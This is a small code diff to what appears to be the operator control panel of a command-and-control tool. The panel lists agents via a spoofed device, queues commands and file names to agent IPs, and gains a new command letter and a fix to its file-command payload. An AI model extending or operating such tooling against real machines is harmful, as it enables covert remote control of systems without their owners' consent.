@@ -50,7 +50,7 @@ Control Panel:
                 list_agents(spoofed_device)
             elif command_input == 'q':
                 os._exit(0)
-            elif command_input[0] in ('c', 'm', 'f'):
+            elif command_input[0] in ('c', 'm', 'f', 'g'):
                 if not args.is_c2 and command_input.startswith('c'):
                     print("C2 only command.")
                     continue
@@ -74,7 +74,8 @@ Control Panel:
                     if command_input[0] == 'f':
                         file_name = os.path.basename(command_input[2:]).encode('utf8')
                         file_name_length = len(file_name).to_bytes(4, byteorder='big')
-                        content = file_name_length + content
+                        content = file_name_length + file_name
+                        print("File Command", content)
                     queued = spoofed_device.queue_message(agent_ip, command, content)
                     if queued:
                         print(f"Message queued for {agent_ip}")
